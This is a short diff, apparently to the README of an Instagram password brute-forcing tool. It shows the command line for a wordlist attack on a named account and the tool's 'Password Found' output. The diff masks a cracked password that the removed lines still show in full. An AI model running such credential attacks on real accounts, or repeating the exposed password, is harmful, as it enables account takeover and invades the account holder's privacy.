@@ -100,7 +100,7 @@ C:\Users\root\Desktop\Instagram>python3 instagram.py pabhkn password.lst -m 0
 ```
 [-] Wordlist: password.lst
 [-] Username: pabhkn
-[-] Password: 9410673959
+[-] Password: 9x1xx739xx
 [-] Complete: 62.67%
 [-] Attempts: 314
 [-] Browsers: 185
@@ -108,5 +108,5 @@ C:\Users\root\Desktop\Instagram>python3 instagram.py pabhkn password.lst -m 0
 
 [!] Password Found
 [+] Username: pabhkn
-[+] Password: 9410673959
+[+] Password: 9x1xx739xx
 ```
